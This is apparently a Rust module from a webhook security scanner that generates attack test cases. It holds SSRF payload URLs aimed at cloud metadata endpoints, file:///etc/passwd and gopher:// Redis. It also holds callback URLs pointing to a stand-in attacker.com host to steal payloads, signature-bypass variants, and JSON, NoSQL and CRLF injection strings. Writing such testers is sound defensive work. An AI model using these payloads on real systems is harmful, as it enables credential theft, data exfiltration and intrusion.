use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::fmt;

/// Severity for webhook security findings.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum WebhookSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for WebhookSeverity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            WebhookSeverity::Info => write!(f, "Info"),
            WebhookSeverity::Low => write!(f, "Low"),
            WebhookSeverity::Medium => write!(f, "Medium"),
            WebhookSeverity::High => write!(f, "High"),
            WebhookSeverity::Critical => write!(f, "Critical"),
        }
    }
}

/// SSRF via webhook URL finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WebhookSsrfResult {
    pub payload_url: String,
    pub technique: SsrfTechnique,
    pub target_resource: String,
    pub severity: WebhookSeverity,
    pub description: String,
}

/// SSRF technique categories.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum SsrfTechnique {
    LocalhostAccess,
    MetadataEndpoint,
    InternalNetworkScan,
    DnsRebinding,
    UrlSchemeAbuse,
    IpAddressObfuscation,
    RedirectChain,
}

impl fmt::Display for SsrfTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            SsrfTechnique::LocalhostAccess => write!(f, "Localhost Access"),
            SsrfTechnique::MetadataEndpoint => write!(f, "Cloud Metadata Endpoint"),
            SsrfTechnique::InternalNetworkScan => write!(f, "Internal Network Scan"),
            SsrfTechnique::DnsRebinding => write!(f, "DNS Rebinding"),
            SsrfTechnique::UrlSchemeAbuse => write!(f, "URL Scheme Abuse"),
            SsrfTechnique::IpAddressObfuscation => write!(f, "IP Address Obfuscation"),
            SsrfTechnique::RedirectChain => write!(f, "Redirect Chain"),
        }
    }
}

/// Event replay attack finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EventReplayResult {
    pub event_id: String,
    pub replay_count: u32,
    pub accepted: bool,
    pub severity: WebhookSeverity,
    pub description: String,
}

/// Signature bypass finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SignatureBypassResult {
    pub technique: SignatureBypassTechnique,
    pub original_signature: String,
    pub manipulated_signature: String,
    pub accepted: bool,
    pub severity: WebhookSeverity,
    pub description: String,
}

/// Signature bypass technique categories.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum SignatureBypassTechnique {
    EmptySignature,
    MissingHeader,
    AlgorithmSwitch,
    TimingAttack,
    LengthExtension,
    NonCanonicalEncoding,
    ReplayWithTimestamp,
}

impl fmt::Display for SignatureBypassTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            SignatureBypassTechnique::EmptySignature => write!(f, "Empty Signature"),
            SignatureBypassTechnique::MissingHeader => write!(f, "Missing Signature Header"),
            SignatureBypassTechnique::AlgorithmSwitch => write!(f, "Algorithm Switch"),
            SignatureBypassTechnique::TimingAttack => write!(f, "Timing Attack"),
            SignatureBypassTechnique::LengthExtension => write!(f, "Length Extension"),
            SignatureBypassTechnique::NonCanonicalEncoding => {
                write!(f, "Non-Canonical Encoding")
            }
            SignatureBypassTechnique::ReplayWithTimestamp => {
                write!(f, "Replay with Old Timestamp")
            }
        }
    }
}

/// Callback manipulation finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CallbackManipulationResult {
    pub technique: CallbackTechnique,
    pub original_url: String,
    pub manipulated_url: String,
    pub severity: WebhookSeverity,
    pub description: String,
}

/// Callback manipulation technique categories.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum CallbackTechnique {
    UrlRedirect,
    HostOverride,
    PathTraversal,
    ProtocolDowngrade,
    ParameterInjection,
}

impl fmt::Display for CallbackTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            CallbackTechnique::UrlRedirect => write!(f, "URL Redirect"),
            CallbackTechnique::HostOverride => write!(f, "Host Override"),
            CallbackTechnique::PathTraversal => write!(f, "Path Traversal"),
            CallbackTechnique::ProtocolDowngrade => write!(f, "Protocol Downgrade"),
            CallbackTechnique::ParameterInjection => write!(f, "Parameter Injection"),
        }
    }
}

/// Payload injection finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadInjectionResult {
    pub technique: PayloadInjectionTechnique,
    pub field_name: String,
    pub injected_value: String,
    pub severity: WebhookSeverity,
    pub description: String,
}

/// Payload injection technique categories.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum PayloadInjectionTechnique {
    JsonFieldInjection,
    TypeConfusion,
    OversizedPayload,
    NestedObjectBomb,
    UnicodeBypass,
    HeaderInjectionViaPayload,
}

impl fmt::Display for PayloadInjectionTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            PayloadInjectionTechnique::JsonFieldInjection => write!(f, "JSON Field Injection"),
            PayloadInjectionTechnique::TypeConfusion => write!(f, "Type Confusion"),
            PayloadInjectionTechnique::OversizedPayload => write!(f, "Oversized Payload"),
            PayloadInjectionTechnique::NestedObjectBomb => write!(f, "Nested Object Bomb"),
            PayloadInjectionTechnique::UnicodeBypass => write!(f, "Unicode Bypass"),
            PayloadInjectionTechnique::HeaderInjectionViaPayload => {
                write!(f, "Header Injection via Payload")
            }
        }
    }
}

/// Top-level webhook finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WebhookFinding {
    pub category: WebhookAttackCategory,
    pub severity: WebhookSeverity,
    pub title: String,
    pub detail: String,
}

/// Webhook attack category.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum WebhookAttackCategory {
    SsrfViaWebhook,
    EventReplay,
    SignatureBypass,
    CallbackManipulation,
    PayloadInjection,
}

impl fmt::Display for WebhookAttackCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            WebhookAttackCategory::SsrfViaWebhook => write!(f, "SSRF via Webhook"),
            WebhookAttackCategory::EventReplay => write!(f, "Event Replay"),
            WebhookAttackCategory::SignatureBypass => write!(f, "Signature Bypass"),
            WebhookAttackCategory::CallbackManipulation => {
                write!(f, "Callback Manipulation")
            }
            WebhookAttackCategory::PayloadInjection => write!(f, "Payload Injection"),
        }
    }
}

/// Generate SSRF payloads targeting internal resources via webhook URL.
pub fn generate_ssrf_payloads(webhook_url_field: &str) -> Vec<WebhookSsrfResult> {
    let mut results = Vec::new();

    let localhost_variants = [
        ("http://127.0.0.1/", "IPv4 localhost"),
        ("http://[::1]/", "IPv6 localhost"),
        ("http://0.0.0.0/", "All interfaces"),
        ("http://localhost/", "Hostname localhost"),
        ("http://127.1/", "Shortened IPv4 localhost"),
        ("http://0x7f000001/", "Hex-encoded 127.0.0.1"),
        ("http://2130706433/", "Decimal-encoded 127.0.0.1"),
        ("http://017700000001/", "Octal-encoded 127.0.0.1"),
    ];

    for (url, desc) in &localhost_variants {
        results.push(WebhookSsrfResult {
            payload_url: url.to_string(),
            technique: SsrfTechnique::LocalhostAccess,
            target_resource: webhook_url_field.to_string(),
            severity: WebhookSeverity::Critical,
            description: format!("{} via webhook URL to access local services", desc),
        });
    }

    let metadata_endpoints = [
        (
            "http://169.254.169.254/latest/meta-data/",
            "AWS EC2 metadata",
        ),
        (
            "http://metadata.google.internal/computeMetadata/v1/",
            "GCP metadata",
        ),
        (
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "Azure IMDS",
        ),
        (
            "http://100.100.100.200/latest/meta-data/",
            "Alibaba Cloud metadata",
        ),
    ];

    for (url, desc) in &metadata_endpoints {
        results.push(WebhookSsrfResult {
            payload_url: url.to_string(),
            technique: SsrfTechnique::MetadataEndpoint,
            target_resource: webhook_url_field.to_string(),
            severity: WebhookSeverity::Critical,
            description: format!(
                "Access {} to steal cloud credentials and instance identity",
                desc
            ),
        });
    }

    let internal_ranges = [
        "http://10.0.0.1/",
        "http://172.16.0.1/",
        "http://192.168.1.1/",
    ];
    for url in &internal_ranges {
        results.push(WebhookSsrfResult {
            payload_url: url.to_string(),
            technique: SsrfTechnique::InternalNetworkScan,
            target_resource: webhook_url_field.to_string(),
            severity: WebhookSeverity::High,
            description: "Probe internal network range to discover services behind firewall"
                .to_string(),
        });
    }

    results.push(WebhookSsrfResult {
        payload_url: "http://attacker.com/rebind".to_string(),
        technique: SsrfTechnique::DnsRebinding,
        target_resource: webhook_url_field.to_string(),
        severity: WebhookSeverity::High,
        description: "DNS rebinding attack: domain resolves to public IP first, then to 127.0.0.1 on subsequent lookups".to_string(),
    });

    let scheme_payloads = [
        ("file:///etc/passwd", "Local file read via file:// scheme"),
        (
            "gopher://127.0.0.1:6379/_INFO",
            "Redis interaction via gopher:// scheme",
        ),
        (
            "dict://127.0.0.1:11211/stats",
            "Memcached interaction via dict:// scheme",
        ),
    ];
    for (url, desc) in &scheme_payloads {
        results.push(WebhookSsrfResult {
            payload_url: url.to_string(),
            technique: SsrfTechnique::UrlSchemeAbuse,
            target_resource: webhook_url_field.to_string(),
            severity: WebhookSeverity::Critical,
            description: desc.to_string(),
        });
    }

    results.push(WebhookSsrfResult {
        payload_url: "http://attacker.com/redirect?to=http://169.254.169.254/latest/meta-data/"
            .to_string(),
        technique: SsrfTechnique::RedirectChain,
        target_resource: webhook_url_field.to_string(),
        severity: WebhookSeverity::High,
        description:
            "Open redirect chain to bypass URL allowlist and reach cloud metadata endpoint"
                .to_string(),
    });

    results
}

/// Generate event replay attack test cases.
pub fn generate_event_replay_tests(event_id: &str, event_body: &str) -> Vec<EventReplayResult> {
    let mut results = Vec::new();

    results.push(EventReplayResult {
        event_id: event_id.to_string(),
        replay_count: 1,
        accepted: false,
        severity: WebhookSeverity::High,
        description: format!(
            "Replay event '{}' once to test idempotency enforcement",
            event_id
        ),
    });

    results.push(EventReplayResult {
        event_id: event_id.to_string(),
        replay_count: 10,
        accepted: false,
        severity: WebhookSeverity::High,
        description: format!(
            "Replay event '{}' 10 times to test for duplicate processing and billing abuse",
            event_id
        ),
    });

    let modified_id = format!("{}_modified", event_id);
    results.push(EventReplayResult {
        event_id: modified_id,
        replay_count: 1,
        accepted: false,
        severity: WebhookSeverity::Medium,
        description: "Replay with modified event ID to test if only ID-based dedup is used"
            .to_string(),
    });

    let body_hash = format!("{:x}", Sha256::digest(event_body.as_bytes()));
    results.push(EventReplayResult {
        event_id: format!("hash_{}", &body_hash[..8]),
        replay_count: 1,
        accepted: false,
        severity: WebhookSeverity::Medium,
        description: "Replay with identical body but new event ID to test content-based dedup"
            .to_string(),
    });

    results
}

/// Evaluate event replay test result.
pub fn evaluate_event_replay(test: &EventReplayResult, accepted: bool) -> EventReplayResult {
    let severity = if accepted {
        WebhookSeverity::Critical
    } else {
        WebhookSeverity::Info
    };

    let description = if accepted {
        format!(
            "Event '{}' accepted after {} replays; no idempotency protection",
            test.event_id, test.replay_count
        )
    } else {
        format!(
            "Event '{}' correctly rejected after {} replay attempts",
            test.event_id, test.replay_count
        )
    };

    EventReplayResult {
        event_id: test.event_id.clone(),
        replay_count: test.replay_count,
        accepted,
        severity,
        description,
    }
}

/// Generate signature bypass test cases.
pub fn generate_signature_bypass_tests(original_signature: &str) -> Vec<SignatureBypassResult> {
    let mut results = Vec::new();

    results.push(SignatureBypassResult {
        technique: SignatureBypassTechnique::EmptySignature,
        original_signature: original_signature.to_string(),
        manipulated_signature: String::new(),
        accepted: false,
        severity: WebhookSeverity::Critical,
        description: "Send webhook with empty signature header to test if verification is enforced"
            .to_string(),
    });

    results.push(SignatureBypassResult {
        technique: SignatureBypassTechnique::MissingHeader,
        original_signature: original_signature.to_string(),
        manipulated_signature: "<omitted>".to_string(),
        accepted: false,
        severity: WebhookSeverity::Critical,
        description: "Omit signature header entirely to test if server requires it".to_string(),
    });

    let algo_switch = if original_signature.starts_with("sha256=") {
        original_signature.replacen("sha256=", "sha1=", 1)
    } else if original_signature.starts_with("sha1=") {
        original_signature.replacen("sha1=", "md5=", 1)
    } else {
        format!(
            "md5={}",
            &original_signature[..original_signature.len().min(32)]
        )
    };
    results.push(SignatureBypassResult {
        technique: SignatureBypassTechnique::AlgorithmSwitch,
        original_signature: original_signature.to_string(),
        manipulated_signature: algo_switch,
        accepted: false,
        severity: WebhookSeverity::High,
        description:
            "Switch signature algorithm prefix to test if server accepts weaker algorithms"
                .to_string(),
    });

    results.push(SignatureBypassResult {
        technique: SignatureBypassTechnique::TimingAttack,
        original_signature: original_signature.to_string(),
        manipulated_signature: generate_partial_signature(original_signature),
        accepted: false,
        severity: WebhookSeverity::Medium,
        description: "Send partially-correct signatures to detect timing-based comparison leaks"
            .to_string(),
    });

    let extended = format!("{}{}", original_signature, "deadbeef");
    results.push(SignatureBypassResult {
        technique: SignatureBypassTechnique::LengthExtension,
        original_signature: original_signature.to_string(),
        manipulated_signature: extended,
        accepted: false,
        severity: WebhookSeverity::High,
        description: "Append data to signature to test for hash length extension vulnerability"
            .to_string(),
    });

    let non_canonical = original_signature.to_uppercase();
    results.push(SignatureBypassResult {
        technique: SignatureBypassTechnique::NonCanonicalEncoding,
        original_signature: original_signature.to_string(),
        manipulated_signature: non_canonical,
        accepted: false,
        severity: WebhookSeverity::Low,
        description: "Send uppercased signature to test case-sensitive comparison".to_string(),
    });

    results.push(SignatureBypassResult {
        technique: SignatureBypassTechnique::ReplayWithTimestamp,
        original_signature: original_signature.to_string(),
        manipulated_signature: original_signature.to_string(),
        accepted: false,
        severity: WebhookSeverity::High,
        description:
            "Replay valid signature from a past event to test timestamp-based freshness validation"
                .to_string(),
    });

    results
}

/// Generate callback manipulation test cases.
pub fn generate_callback_manipulations(
    original_callback_url: &str,
) -> Vec<CallbackManipulationResult> {
    let mut results = Vec::new();

    results.push(CallbackManipulationResult {
        technique: CallbackTechnique::UrlRedirect,
        original_url: original_callback_url.to_string(),
        manipulated_url: "https://attacker.com/steal".to_string(),
        severity: WebhookSeverity::Critical,
        description:
            "Replace callback URL with attacker-controlled server to steal webhook payloads"
                .to_string(),
    });

    let host_replaced = if let Some(rest) = original_callback_url.strip_prefix("https://") {
        if let Some(path_start) = rest.find('/') {
            format!("https://attacker.com{}", &rest[path_start..])
        } else {
            "https://attacker.com/".to_string()
        }
    } else {
        "https://attacker.com/".to_string()
    };
    results.push(CallbackManipulationResult {
        technique: CallbackTechnique::HostOverride,
        original_url: original_callback_url.to_string(),
        manipulated_url: host_replaced,
        severity: WebhookSeverity::Critical,
        description:
            "Override host in callback URL while preserving path to bypass path-only validation"
                .to_string(),
    });

    results.push(CallbackManipulationResult {
        technique: CallbackTechnique::PathTraversal,
        original_url: original_callback_url.to_string(),
        manipulated_url: format!("{}/../admin/secrets", original_callback_url),
        severity: WebhookSeverity::High,
        description: "Inject path traversal in callback URL to access restricted endpoints on the callback server".to_string(),
    });

    let downgraded = original_callback_url.replacen("https://", "http://", 1);
    results.push(CallbackManipulationResult {
        technique: CallbackTechnique::ProtocolDowngrade,
        original_url: original_callback_url.to_string(),
        manipulated_url: downgraded,
        severity: WebhookSeverity::High,
        description: "Downgrade callback from HTTPS to HTTP to intercept webhook data in transit"
            .to_string(),
    });

    results.push(CallbackManipulationResult {
        technique: CallbackTechnique::ParameterInjection,
        original_url: original_callback_url.to_string(),
        manipulated_url: format!("{}?override=true&admin=1", original_callback_url),
        severity: WebhookSeverity::Medium,
        description:
            "Inject query parameters into callback URL to manipulate receiving endpoint behavior"
                .to_string(),
    });

    results
}

/// Generate payload injection test cases.
pub fn generate_payload_injections(target_field: &str) -> Vec<PayloadInjectionResult> {
    let mut results = Vec::new();

    results.push(PayloadInjectionResult {
        technique: PayloadInjectionTechnique::JsonFieldInjection,
        field_name: target_field.to_string(),
        injected_value: format!(
            "\", \"admin\": true, \"role\": \"superuser\", \"{}\": \"original",
            target_field
        ),
        severity: WebhookSeverity::High,
        description:
            "Inject additional JSON fields to escalate privileges via webhook payload parsing"
                .to_string(),
    });

    results.push(PayloadInjectionResult {
        technique: PayloadInjectionTechnique::TypeConfusion,
        field_name: target_field.to_string(),
        injected_value: "{\"$gt\": \"\"}".to_string(),
        severity: WebhookSeverity::High,
        description: "Replace string value with object containing NoSQL operator to trigger type confusion in backend".to_string(),
    });

    let oversized = "A".repeat(1_000_000);
    results.push(PayloadInjectionResult {
        technique: PayloadInjectionTechnique::OversizedPayload,
        field_name: target_field.to_string(),
        injected_value: format!("[1MB payload: {}...]", &oversized[..20]),
        severity: WebhookSeverity::Medium,
        description: "Send 1MB payload to test webhook receiver size limits and potential DoS"
            .to_string(),
    });

    results.push(PayloadInjectionResult {
        technique: PayloadInjectionTechnique::NestedObjectBomb,
        field_name: target_field.to_string(),
        injected_value: generate_nested_json(50),
        severity: WebhookSeverity::Medium,
        description: "Send deeply nested JSON object (50 levels) to test parser stack limits"
            .to_string(),
    });

    results.push(PayloadInjectionResult {
        technique: PayloadInjectionTechnique::UnicodeBypass,
        field_name: target_field.to_string(),
        injected_value: "adm\u{200B}in".to_string(),
        severity: WebhookSeverity::Medium,
        description:
            "Insert zero-width characters in field values to bypass string-match security filters"
                .to_string(),
    });

    results.push(PayloadInjectionResult {
        technique: PayloadInjectionTechnique::HeaderInjectionViaPayload,
        field_name: target_field.to_string(),
        injected_value: "value\r\nX-Injected: true".to_string(),
        severity: WebhookSeverity::High,
        description: "Inject CRLF in payload field value to test if webhook processor reflects values into HTTP headers".to_string(),
    });

    results
}

fn generate_partial_signature(sig: &str) -> String {
    if sig.len() <= 4 {
        return "0000".to_string();
    }
    let prefix_len = sig.len() / 4;
    let zeros = "0".repeat(sig.len() - prefix_len);
    format!("{}{}", &sig[..prefix_len], zeros)
}

fn generate_nested_json(depth: usize) -> String {
    let open: String = (0..depth).map(|_| "{\"a\":").collect();
    let close: String = (0..depth).map(|_| "}").collect();
    format!("{}\"deep\"{}", open, close)
}

/// Run the full webhook security analysis.
pub fn run_webhook_security_analysis(
    webhook_url_field: &str,
    callback_url: Option<&str>,
    event_id: Option<&str>,
    event_body: Option<&str>,
    signature: Option<&str>,
    payload_field: Option<&str>,
) -> Vec<WebhookFinding> {
    let mut findings = Vec::new();

    let ssrf_payloads = generate_ssrf_payloads(webhook_url_field);
    for payload in &ssrf_payloads {
        findings.push(WebhookFinding {
            category: WebhookAttackCategory::SsrfViaWebhook,
            severity: payload.severity,
            title: format!("{} via webhook URL", payload.technique),
            detail: payload.description.clone(),
        });
    }

    if let (Some(eid), Some(body)) = (event_id, event_body) {
        let replay_tests = generate_event_replay_tests(eid, body);
        for test in &replay_tests {
            findings.push(WebhookFinding {
                category: WebhookAttackCategory::EventReplay,
                severity: test.severity,
                title: format!("Event replay: {} ({}x)", test.event_id, test.replay_count),
                detail: test.description.clone(),
            });
        }
    }

    if let Some(sig) = signature {
        let sig_tests = generate_signature_bypass_tests(sig);
        for test in &sig_tests {
            findings.push(WebhookFinding {
                category: WebhookAttackCategory::SignatureBypass,
                severity: test.severity,
                title: format!("Signature bypass: {}", test.technique),
                detail: test.description.clone(),
            });
        }
    }

    if let Some(cb_url) = callback_url {
        let cb_manips = generate_callback_manipulations(cb_url);
        for manip in &cb_manips {
            findings.push(WebhookFinding {
                category: WebhookAttackCategory::CallbackManipulation,
                severity: manip.severity,
                title: format!("Callback {}", manip.technique),
                detail: manip.description.clone(),
            });
        }
    }

    if let Some(field) = payload_field {
        let injections = generate_payload_injections(field);
        for inj in &injections {
            findings.push(WebhookFinding {
                category: WebhookAttackCategory::PayloadInjection,
                severity: inj.severity,
                title: format!("{} in '{}'", inj.technique, inj.field_name),
                detail: inj.description.clone(),
            });
        }
    }

    findings
}
